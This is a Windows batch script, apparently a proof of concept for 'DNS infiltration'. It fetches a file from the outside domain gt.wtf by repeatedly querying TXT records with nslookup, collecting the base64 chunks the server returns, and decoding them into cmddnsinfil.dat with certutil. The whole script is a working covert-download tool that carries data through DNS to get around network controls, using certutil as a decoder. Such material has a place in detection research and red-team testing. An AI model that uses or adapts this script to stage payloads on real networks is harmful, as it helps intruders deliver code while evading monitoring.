@echo off
REM gets sample files listed on http://psdnsinfil.gt.wtf/files.htm


set resourcenumber=2
set targetfilename=cmddnsinfil.dat

set tmpfilename=cmddnsinfil.tmp
set endofdata=~cmddnsinfil.tmp
if exist %tmpfilename% del %tmpfilename%
if exist %endofdata% del %endofdata%

for /l %%c in (0,180,450000) do (
	if not exist %endofdata% (
		@call :proc0 %%c 
		ping -n 2 localhost > nul 
		)
	)	
if exist %endofdata% del %endofdata%
certutil.exe -decode %tmpfilename% %targetfilename%
rem del %tmpfilename%
@goto :eof

:proc0
@rem echo proc0 %1
for /f "skip=4" %%i in ('"nslookup -q=txt %resourcenumber%-%1-180.y.gt.wtf"') do @call :proc1 %%i
goto :eof

:proc1
set p1=%1
set p1=%p1:"=%
@rem echo #%p1%#
if "%p1%" EQU "====" (
	if not exist %endofdata% echo 1 > %endofdata%
	) else (
	echo %p1% >> %tmpfilename%
	)
goto :eof
